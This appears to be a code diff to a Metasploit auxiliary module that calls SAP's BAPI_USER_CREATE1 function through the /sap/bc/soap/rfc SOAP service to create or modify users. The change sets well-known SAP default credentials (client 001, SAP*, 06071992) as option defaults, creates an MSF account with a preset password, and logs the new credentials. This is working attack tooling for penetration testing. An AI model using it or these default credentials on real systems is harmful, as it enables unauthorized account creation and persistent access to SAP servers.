@@ -26,23 +26,30 @@ class Metasploit4 < Msf::Auxiliary
 
 	def initialize
 		super(
-			'Name' => 'SAP SOAP RFC BAPI_USER_CREATE1',
+			'Name' => 'SAP /sap/bc/soap/rfc SOAP Service BAPI_USER_CREATE1 Function User Creation',
 			'Description' => %q{
-				This module calls the RFC BAPI_USER_CREATE1 module (via SOAP).
-				The module can be used for creating/modifying users.
-				},
-			'References'     => [[ 'URL', 'http://labs.mwrinfosecurity.com/tools/2012/04/27/sap-metasploit-modules/' ]],
-			'Author'         => ['Agnivesh Sathasivam','nmonkee'],
-			'License'        => BSD_LICENSE
-			)
+					This module makes use of the BAPI_USER_CREATE1 function, through the SOAP
+				/sap/bc/soap/rfc service, for creating/modifying users on a SAP.
+			},
+			'References' =>
+				[
+					[ 'URL', 'http://labs.mwrinfosecurity.com/tools/2012/04/27/sap-metasploit-modules/' ]
+				],
+			'Author' =>
+				[
+					'Agnivesh Sathasivam',
+					'nmonkee'
+				],
+			'License' => MSF_LICENSE
+		)
 		register_options([
-			OptString.new('CLIENT', [true, 'SAP client', nil]),
-			OptString.new('USERNAME', [true, 'Username', nil]),
-			OptString.new('PASSWORD', [true, 'Password', nil]),
-			OptString.new('BAPI_FIRST',[false,'First name','John']),
-			OptString.new('BAPI_LAST',[false,'Last name','Doe']),
-			OptString.new('BAPI_PASSWORD',[false,'Password for the account (Default is 06071992)','06071992']),
-			OptString.new('BAPI_USER',[false,'Username for the account (Usrename in upper case only. Default is ADMIN)', 'ADMIN'])
+			OptString.new('CLIENT', [true, 'SAP client', '001']),
+			OptString.new('USERNAME', [true, 'Username', 'SAP*']),
+			OptString.new('PASSWORD', [true, 'Password', '06071992']),
+			OptString.new('BAPI_FIRST',[true,'First name','John']),
+			OptString.new('BAPI_LAST',[true,'Last name','Doe']),
+			OptString.new('BAPI_PASSWORD',[true,'Password for the account (Default is msf1234)','msf1234']),
+			OptString.new('BAPI_USER',[true,'Username for the account (Username in upper case only. Default is MSF)', 'MSF'])
 			], self.class)
 	end
 
@@ -77,19 +84,34 @@ class Metasploit4 < Msf::Auxiliary
 					'Content-Type'   => 'text/xml; charset=UTF-8'
 					}
 				}, 45)
-			if res and res.code = 200
+			if res and res.code == 200
 				if res.body =~ /<h1>Logon failed<\/h1>/
 					print_error("[SAP] #{ip}:#{rport} - Logon failed")
+					return
 				elsif res.body =~ /faultstring/
 					error = []
 					error.push(res.body.scan(%r{<faultstring>(.*?)</faultstring>}))
 					print_error("[SAP] #{ip}:#{rport} - #{error.join().chomp}")
+					return
 				else
 					print_good("[SAP] #{ip}:#{rport} - User '#{datastore['BAPI_USER']}' with password '#{datastore['BAPI_PASSWORD']}' created")
+					report_auth_info(
+						:host => ip,
+						:port => rport,
+						:sname => "sap",
+						:user => "#{datastore['BAPI_USER']}",
+						:pass => "#{datastore['BAPI_PASSWORD']}",
+						:active => true
+					)
+					return
 				end
 			else
-				print_error("[SAP] #{ip}:#{rport} - Error code: " + res.code) if res
-				print_error("[SAP] #{ip}:#{rport} - Error message: " + res.message) if res
+				print_error("[SAP] #{ip}:#{rport} - Unknown Error")
+				if res
+					print_error("[SAP] #{ip}:#{rport} - Error code: #{res.code}")
+					print_error("[SAP] #{ip}:#{rport} - Error message: #{res.message}")
+				end
+				return
 			end
 		rescue ::Rex::ConnectionError
 			print_error("[SAP] #{ip}:#{rport} - Unable to connect")
